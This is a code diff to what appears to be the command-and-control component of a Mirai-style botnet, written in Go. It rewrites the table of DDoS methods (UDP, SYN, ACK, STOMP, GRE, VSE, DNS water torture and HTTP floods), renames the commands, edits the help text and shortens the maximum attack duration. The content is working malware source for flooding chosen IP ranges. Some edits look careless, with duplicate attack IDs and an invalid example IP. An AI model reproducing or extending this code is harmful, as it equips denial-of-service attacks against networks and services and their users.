@@ -19,8 +19,8 @@ type AttackInfo struct {
 type Attack struct {
     Duration    uint32
     Type        uint8
-    Targets     map[uint32]uint8    // Prefix/netmask
-    Flags       map[uint8]string    // key=value
+    Targets     map[uint32]uint8  
+    Flags       map[uint8]string  
 }
 
 type FlagInfo struct {
@@ -117,6 +117,11 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
         22,
         "HTTP path, default is /",
     },
+    /*"ssl": FlagInfo {
+        23,
+        "Use HTTPS/SSL"
+    },
+    */
     "conns": FlagInfo {
         24,
         "Number of connections",
@@ -128,46 +133,65 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
 }
 
 var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
-    
-    "udp": AttackInfo {
+    "!mudp": AttackInfo {
         0,
         []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
-        "udp [ip] [time] dport=[port]",
+        "udp flood with more options",
     },
-    "syn": AttackInfo {
+    "!vse": AttackInfo {
         1,
-        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
-        "syn [ip] [time] dport=[port]",
+        []uint8 { 2, 3, 4, 5, 6, 7 },
+        "valve game server based flood",
     },
-    "ack": AttackInfo {
+    "!dns": AttackInfo {
         2,
-        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
-        "ack [ip] [time] dport=[port]",
+        []uint8 { 2, 3, 4, 5, 6, 7, 8, 9 },
+        "dns water torture",
     },
-    "udpplain": AttackInfo {
+    "!syn": AttackInfo {
         3,
-        []uint8 {0, 1, 7},
-        "udpplain [ip] [time] dport=[port]",
+        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
+        "tcp based syn flood",
     },
-    "std": AttackInfo {
+    "!ack": AttackInfo {
         4,
-        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
-        "std [ip] [time] dport=[port]",
+        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
+        "tcp based ack flood",
     },
-    "greip": AttackInfo {
+    "!ovh": AttackInfo {
+        4,
+        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
+        "tcp based ack flood",
+    },
+    "!stomp": AttackInfo {
         5,
         []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
-        "greip [ip] [time] dport=[port]",
+        "tcp based stomp flood",
     },
-    "vse": AttackInfo {
+    "!greip": AttackInfo {
         6,
-        []uint8 { 2, 3, 4, 5, 6, 7 },
-        "vse [ip] [time] dport=[port]",
+        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
+        "greip flood",
     },
-    "httpnull": AttackInfo {
+    "!greeth": AttackInfo {
         7,
+        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
+        "greeth flood",
+    },
+    "!udpplain": AttackInfo {
+        9,
+        []uint8 {0, 1, 7},
+        "less options more pps",
+    },
+    "!std": AttackInfo {
+        9,
+        []uint8 {0, 1, 7},
+        "less options more pps",
+    },
+    "!http": AttackInfo {
+        10,
         []uint8 {8, 7, 20, 21, 22, 24},
-        "httpnull [ip] [time] domain=[ip] conns=[300]",
+        "http flood",
     },
     
 }
@@ -188,10 +212,10 @@ func NewAttack(str string, admin int) (*Attack, error) {
     var atkInfo AttackInfo
     // Parse attack name
     if len(args) == 0 {
-        return nil, errors.New("Must Specify an Attack Name")
+        return nil, errors.New("Must specify an attack name")
     } else {
         if args[0] == "?" {
-            validCmdList := "\033[37;1mAvailable Attack List\r\n\033[1;31m"
+            validCmdList := "\x1b[0;36mavailable methods:\r\n\x1b[1;35m"
             for cmdName, atkInfo := range attackInfoLookup {
                 validCmdList += cmdName + ": " + atkInfo.attackDescription + "\r\n"
             }
@@ -200,7 +224,7 @@ func NewAttack(str string, admin int) (*Attack, error) {
         var exists bool
         atkInfo, exists = attackInfoLookup[args[0]]
         if !exists {
-            return nil, errors.New(fmt.Sprintf("\033[33;1m%s \033[31mIs Not a Valid Attack!", args[0]))
+            return nil, errors.New(fmt.Sprintf("\033[33;1m%s \033[31mis not a valid attack!", args[0]))
         }
         atk.Type = atkInfo.attackID
         args = args[1:]
@@ -208,10 +232,10 @@ func NewAttack(str string, admin int) (*Attack, error) {
 
     // Parse targets
     if len(args) == 0 {
-        return nil, errors.New("Must Specify Prefix/Netmask as Targets")
+        return nil, errors.New("Must specify prefix/netmask as targets")
     } else {
         if args[0] == "?" {
-            return nil, errors.New("\033[37;1mComma Delimited list of Target Prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
+            return nil, errors.New("\033[37;1mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 1185.250.240.236/8\r\nEx: 8.8.8.8,127.0.0.0/29")
         }
         cidrArgs := strings.Split(args[0], ",")
         if len(cidrArgs) > 255 {
@@ -246,14 +270,14 @@ func NewAttack(str string, admin int) (*Attack, error) {
 
     // Parse attack duration time
     if len(args) == 0 {
-        return nil, errors.New("Must Specify an Attack Duration")
+        return nil, errors.New("Must specify an attack duration")
     } else {
         if args[0] == "?" {
-            return nil, errors.New("\033[37;1mDuration of The Attack, in Seconds")
+            return nil, errors.New("\033[37;1mDuration of the attack, in seconds")
         }
         duration, err := strconv.Atoi(args[0])
-        if err != nil || duration == 0 || duration > 86400 {
-            return nil, errors.New(fmt.Sprintf("Invalid Attack Duration, near %s. Duration must be between 0 and 86400 seconds", args[0]))
+        if err != nil || duration == 0 || duration > 3600 {
+            return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 3600 seconds", args[0]))
         }
         atk.Duration = uint32(duration)
         args = args[1:]
